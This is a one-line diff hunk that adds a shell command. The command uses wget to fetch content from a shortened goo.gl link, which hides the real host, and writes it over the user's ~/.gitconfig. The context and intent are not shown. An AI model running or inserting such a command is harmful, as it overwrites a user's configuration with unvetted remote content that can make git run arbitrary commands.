@@ -1,0 +1,1 @@
+wget -O ~/.gitconfig goo.gl/x9H6rn
